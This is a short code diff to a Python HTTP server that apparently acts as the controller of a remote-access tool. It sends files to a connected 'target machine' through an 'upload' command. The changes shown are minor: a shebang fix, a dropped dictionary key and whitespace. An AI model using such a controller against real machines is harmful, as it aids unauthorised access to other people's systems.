@@ -1,4 +1,4 @@
-#!/usr/bin/env/python3
+#!/usr/bin/python3
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import cgi
 from os import path
@@ -37,7 +37,7 @@ class HTTPHandler(BaseHTTPRequestHandler):
             saveName=input(f"How do you want to save {fileToSend} in the target machine's current working directory ? ")
             with open("uploads/"+fileToSend,"rb") as f:
                 file_content = f.read()
-            file={'file': fileToSend ,'name': saveName, 'data': file_content }
+            file={'name': saveName, 'data': file_content }
             data= "upload "+str(file)
             self.wfile.write(bytes(data, "utf-8"))
         else:
@@ -59,4 +59,4 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 print (str(E))
     
 
-         
+
